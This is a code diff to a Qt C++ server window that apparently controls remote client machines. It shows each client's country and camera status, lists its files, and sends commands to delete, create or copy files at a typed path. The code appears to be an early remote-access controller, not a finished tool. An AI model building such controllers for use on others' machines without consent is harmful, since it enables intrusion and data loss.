@@ -30,7 +30,7 @@ void MainWindow::ServerStartup()
             qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
 
             QByteArray data = client->readAll();
-
+            qDebug() << 1;
             if(data.startsWith("#getPcInformation:"))
             {
                 data = data.mid(18);
@@ -44,16 +44,20 @@ void MainWindow::ServerStartup()
                 countryLabel->setText(parts[5]);
                 camLabel->setText(parts[6]);
             }
-
-            if(data.startsWith("#getCFileTree:"))
+            if(data.startsWith("#getFileTree:"))
             {
-                data = data.mid(14);
-                cFiles += data;
-
-
-                workWithCFiles();
+                Files = data.mid(13);
+                workWithFiles();
             }
+            if(data.startsWith("#getAllFolders:"))
+            {
+                Files = data.mid(15);
+                workWithFiles();
+            }
+            if(data.startsWith("#copyFiles:"))
+            {
 
+            }
         });
 
         QObject::connect(client,&QTcpSocket::disconnected,this,[&](){
@@ -185,18 +189,15 @@ void MainWindow::on_filesButton_clicked()
 
 void MainWindow::on_showC_clicked()
 {
-    QByteArray requestForPcName = "#getCFileTree";
-    client->write(requestForPcName);   
+    ui->stackedWidget->setCurrentIndex(1);
 }
 
-void MainWindow::workWithCFiles()
+void MainWindow::workWithFiles()
 {
-    ui->stackedWidget->setCurrentIndex(1);
-
     QWidget *container = new QWidget();
 
     QLabel *label = new QLabel(container);
-    label->setText(cFiles);
+    label->setText(Files);
     label->setWordWrap(true);
     label->adjustSize();
 
@@ -204,5 +205,64 @@ void MainWindow::workWithCFiles()
 
     ui->scrollAreaC->setWidget(container);
     ui->scrollAreaC->setWidgetResizable(false);
-    qDebug() << cFiles;
 }
+
+void MainWindow::on_getPath_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#getFileTree:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
+
+void MainWindow::on_deleteFile_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#deleteFile:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
+
+void MainWindow::on_deleteDir_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#deleteDir:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
+
+void MainWindow::on_createFile_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#createFile:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
+
+void MainWindow::on_deleteDir_2_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#getAllFolders:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
+
+void MainWindow::on_copyFile_clicked()
+{
+    QString path = ui->searchPath->text();
+    QByteArray requestData = "#copyFiles:" + path.toLatin1();
+    client->write(requestData);
+    requestData.clear();
+    path.clear();
+}
+
